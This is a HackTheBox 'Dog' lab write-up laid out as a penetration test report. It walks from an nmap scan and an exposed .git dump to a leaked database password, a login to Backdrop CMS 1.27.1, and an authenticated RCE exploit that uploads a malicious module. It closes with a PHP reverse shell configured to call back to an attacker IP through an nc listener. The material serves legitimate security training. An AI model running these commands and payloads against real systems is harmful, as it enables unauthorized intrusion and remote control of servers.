# 🐾 Penetration Test Report – HTB “Dog” Machine

**Target IP**: `10.10.11.58`  
  
**Tester**: *PRIME*

---

## 🔐 1. VPN Connection

Before interacting with the target machine, a VPN connection was established via the HTB platform to securely access the internal lab environment.

📸 **Screenshot 1**: *VPN connection confirmation*  

![VPN Connection](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss1.png?raw=true)


---

## 🔍 2. Initial Scanning & Information Gathering

A detailed Nmap scan was executed to enumerate open ports, services, and potential vulnerabilities.

### 🔧 Command Used:
```bash
nmap -sC -sV -A -T4 -Pn 10.10.11.58 -oN dog.txt
```

🧠 Explanation:

    -sC: Default scripts

    -sV: Service/version detection

    -A: Aggressive scan (OS detection, version detection, script scanning, and traceroute)

    -T4: Faster execution

    -Pn: No ping

    -oN: Output to dog.txt

📸 Screenshot 2 & 3: 

Nmap Scan 

![Nmap Scan](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/SS2.png?raw=true)

Nmap Result

![Nmap Result](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss3.png?raw=true)


💡 3. Discovery – Exposed Git Repository

The Nmap scan revealed that the .git directory was publicly accessible via HTTP.

    ⚠️ Security Risk: This misconfiguration allows an attacker to download the entire Git repository and potentially access sensitive files, credentials, or code history.

🌐 Discovery URL:

http://10.10.11.58/.git/

📦 4. Git Dumping

Used GitTools from InternetWache to dump the exposed repository.
🔧 Tool Used:

GitTools – InternetWache
💻 Command Executed:

```bash
./gitdumper.sh http://10.10.11.58/.git/ git-dump
```

This successfully downloaded the contents of the exposed .git directory for offline analysis.


📸 Screenshot 4: Git dump execution result

![Git dump execution result](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss4.png?raw=true)


🔑 5. Credential Discovery – settings.php

After successfully dumping the exposed Git repository, I reviewed the contents for sensitive information. One file of particular interest was settings.php, which is part of a Backdrop CMS installation.

Within this file, hardcoded credentials for the MySQL database were discovered:

$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';

🧠 Breakdown:

    Username: root

    Password: BackDropJ2024DS2024

    Host: 127.0.0.1 (localhost)

    Database: backdrop

This information could allow an attacker to:

    Gain full access to the database (if MySQL is accessible remotely or through a web shell).

    Enumerate users, passwords, content, and sensitive configurations.

    Potentially escalate to full system compromise if RCE is available via SQL injection or file upload functionality.

🔒 Security Risk:

    Hardcoding database credentials in a Git repository is a high-severity vulnerability.

    Credentials should be stored in environment variables or secured configuration files that are not tracked by version control (e.g., using .gitignore).

Dog Files

![DOG Files](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss5.png?raw=true)

Credential Discovery – settings.php

![DOG Files](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss6.png?raw=true)

🕵️‍♀️ 7. Username Enumeration – Email Discovery

During source code analysis, the following command was used to search for references to internal email addresses or usernames tied to the domain:
🔎 Command Executed:

grep -R "@dog.htb" *

📄 Result:

files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"

🧩 Interpretation:

An email address was discovered embedded in a configuration JSON file:

    ✅ Discovered Username/Email: tiffany@dog.htb

📄 Result:

![Result](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss7.png?raw=true)

🧪 8. Authentication Attempt
🎯 Target:

    Web Login Page (likely at http://10.10.11.58/ or a /login path)

🧑‍💻 Credentials Tested:
Field	Value
🧪 8. Authentication Attempt
🎯 Target:

    Web Login Page (likely at http://10.10.11.58/ or a /login path)

🧑‍💻 Credentials Tested:
Field	Value
Username	tiffany@dog.htb
Password	BackDropJ2024DS2024
Username	tiffany@dog.htb

Password	BackDropJ2024DS2024

Log in

![Log in](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss8.png?raw=true)

🧩 9. Post-Login Reconnaissance – Backdrop CMS Dashboard

Upon successful login with the recovered credentials, we explored the Backdrop CMS admin dashboard and identified several key details and potential misconfigurations:

⚙️ System Configuration Summary

Component	Value / Version	Remarks

Component | Value / Version | Remarks
Backdrop CMS | 1.27.1 | ✅ CMS identified — may be vulnerable depending on modules/plugins used
PHP | 7.4.3-4ubuntu2.28 | ⚠️ EOL: PHP 7.4 is no longer supported — potential for known exploits
MySQL | 8.0.41-0ubuntu0.20.04.1 | ✅ Modern version — not immediately vulnerable
Web Server | Apache/2.4.41 (Ubuntu) | 📌 Confirmed server software
CKEditor | 5 (Version 40.2.0) | ✅ May be exploitable via XSS or file upload if misconfigured
Telemetry | Enabled | 🧪 Sends data to Backdrop — could be used for fingerprinting
Access to update.php | Protected | ✅ Mitigates RCE from unauthorized access
File System | Writable (public download method) | ⚠️ Writable FS may allow file upload exploitation

![Version](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss10.png?raw=true)

🔍 10 .Exploiting Backdrop CMS v1.27.1 - Authenticated RCE

Using searchsploit, an exploit was found for Backdrop CMS v1.27.1 that allows Authenticated Remote Command Execution (RCE).

Commands and Output:

┌──(root㉿kali)-[/home/kali/htb/dog]
└─# searchsploit backdrop cms 1.27.1    

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)                                                                                                                                        | php/webapps/52021.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

Downloaded the exploit:

┌──(root㉿kali)-[/home/kali/htb/dog]
└─# searchsploit -m php/webapps/52021.py

  Exploit: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/52021
     Path: /usr/share/exploitdb/exploits/php/webapps/52021.py
    Codes: N/A
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable
cp: overwrite '/home/kali/htb/dog/52021.py'? 
Copied to: /home/kali/htb/dog/52021.py

File listing confirms the exploit script was saved:

┌──(root㉿kali)-[/home/kali/htb/dog]
└─# ls                                  
10.10.11.58  52021.py  dog.txt  ffuf_results.txt  GitDump  git.sh  GitTools  output

Executed the exploit to generate a malicious module:

┌──(root㉿kali)-[/home/kali/htb/dog]
└─# python3 52021.py http://10.10.11.58       
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php

Next Steps:

    Upload shell.zip via /admin/modules/install

    Trigger RCE by accessing:
    http://10.10.11.58/modules/shell/shell.php

![Shell](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss12.png?raw=true)

🧪 4. Exploitation: PHP Reverse Shell Upload

Upon identifying a file upload feature, a PHP reverse shell was weaponized and uploaded to gain remote access.

Steps:

    Cloned reverse shell from Pentestmonkey’s GitHub repo.

    Replaced any shell.php placeholders with the customized php-reverse-shell.php.

    Edited shell with attacker IP and port:

$ip = '10.10.X.X';  // Your tun0 IP
$port = 4444;       // Your listening port

Packaged the reverse shell into an archive to bypass potential upload restrictions:

tar -czf shell.tar.gz php-reverse-shell.php

Uploaded shell.tar.gz via the web application.

Extracted it on the server (if upload functionality did that automatically or by abusing extraction logic).

Set up listener:

    nc -lvnp 4444

Once triggered, a reverse shell connection was established back to the attacking machine.


